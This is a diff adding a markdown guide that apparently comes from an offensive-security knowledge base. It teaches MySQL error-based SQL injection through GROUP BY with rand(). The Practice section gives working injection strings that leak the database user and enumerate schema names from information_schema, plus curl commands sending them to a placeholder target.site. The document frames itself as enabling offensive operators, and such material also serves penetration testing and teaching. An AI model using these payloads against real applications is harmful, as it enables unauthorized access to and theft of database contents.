@@ -1,0 +1,91 @@
+---
+title: MySQL Error Based SQL Injection Using GROUP BY and rand()
+description: Learn how to exploit MySQL error-based SQL injection vulnerabilities using the GROUP BY clause and rand() function. Discover techniques for triggering duplicate entry errors to extract sensitive database information through error messages.
+keywords:
+  - mysql error based
+  - sql injection
+  - group by error
+  - rand() function
+  - duplicate entry error
+  - database exploitation
+  - information disclosure
+  - web application security
+  - mysql vulnerability
+  - error message leakage
+---
+# MYSQL Error Based - GROUP BY
+
+## Context
+
+This guide enables offensive operators to exploit MySQL error-based SQL injection through the GROUP BY clause, specifically by leveraging the use of the `rand()` function to trigger and extract sensitive information from database error messages. The intended reader should understand SQL query structure, the basics of SQL injection, MySQL error messaging, and the mechanics of HTTP request-response cycles.
+
+## Theory
+
+### Error-Based SQL Injection in MySQL
+
+Error-based SQL injection is a technique where the attacker manipulates input to generate database errors that disclose valuable information. MySQL is particularly prone to revealing internal details in its error messages when handling malformed queries or logic errors. Skilled attackers exploit this behavior by injecting payloads specifically designed to trigger those errors, then analyze the resulting error output for hints about the database schema, contents, or configuration.
+
+### GROUP BY and rand() Error Generation
+
+Using the `GROUP BY` clause with the `rand()` function is a well-established method for causing MySQL to throw an error. When `rand()` is combined in such a way that it generates duplicate groupings, MySQL issues a "Duplicate entry" error. This error commonly includes fragments of the malicious query in its output, creating an opportunity for attackers to inject subqueries whose results are leaked via the error.
+
+```mermaid
+flowchart TD;
+    A[Inject rand() in GROUP BY] --> B[MySQL processes query];
+    B --> C[Duplicate entry error triggered];
+    C --> D[Error message reveals data];
+```
+
+### Exploiting MySQL Error Messages
+
+MySQL error messages may include parts of the injected query or even the actual database data, depending on how the query is constructed. Crafting payloads to incorporate subqueries—such as `user()` or extracting schema names—maximizes the leakage in error outputs. The attacker iteratively builds and refines these payloads to retrieve more specific pieces of information through repeated error generation.
+
+### Attacker Mindset and Threat Surface
+
+Successful exploitation relies on targeting web applications that are both vulnerable to unsanitized SQL input and configured to display verbose MySQL error messages. The attacker’s approach is to maximize the verbosity of these errors and to structure payloads in a way that the resulting error reveals database schema details, users, or data. Recognizing the threat surface requires understanding which endpoints reflect database errors and how to control input in those contexts.
+
+## Practice
+
+### Triggering MySQL Error via GROUP BY and rand()
+
+- Inject a crafted payload into a vulnerable parameter to force a duplicate entry error, which will leak the current MySQL database user in the error message.
+
+    ```sql
+    1' GROUP BY CONCAT_WS(0x3a, user(), FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+    ```
+
+- The above payload works by using `CONCAT_WS` to join the output of `user()` (the current database username) with the result of `FLOOR(RAND(0)*2)`. Due to how `rand()` can produce the same value multiple times as the query executes, this often results in a "Duplicate entry" error.
+
+- Use `curl` to send the injection to the vulnerable endpoint:
+
+    ```bash
+    curl -i 'http://target.site/page.php?id=1%27%20GROUP%20BY%20CONCAT_WS(0x3a,user(),FLOOR(RAND(0)*2))%20HAVING%20MIN(0)--%20-'
+    ```
+
+- Analyze the HTTP response carefully to identify MySQL error messages. The error should include the database user, verifying the injection and error leakage.
+
+### Enumerating Database Names via Error-Based Injection
+
+- Escalate information disclosure by adjusting the payload to leak database names from `information_schema.schemata`. The first database name can be retrieved as follows:
+
+    ```sql
+    1' GROUP BY CONCAT_WS(0x3a, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+    ```
+
+- This payload selects the schema name at offset 0, causing MySQL to include this name when producing the duplicate entry error.
+
+- Trigger the payload with:
+
+    ```bash
+    curl -i 'http://target.site/page.php?id=1%27%20GROUP%20BY%20CONCAT_WS(0x3a,(SELECT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%200,1),FLOOR(RAND(0)*2))%20HAVING%20MIN(0)--%20-'
+    ```
+
+- To enumerate additional database names, increment the LIMIT offset (e.g., `LIMIT 1,1`, `LIMIT 2,1`, etc.) and repeat the exploitation process.
+
+- Again, review the HTTP response for MySQL error messages, which should contain the leaked schema names.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **sqlmap**
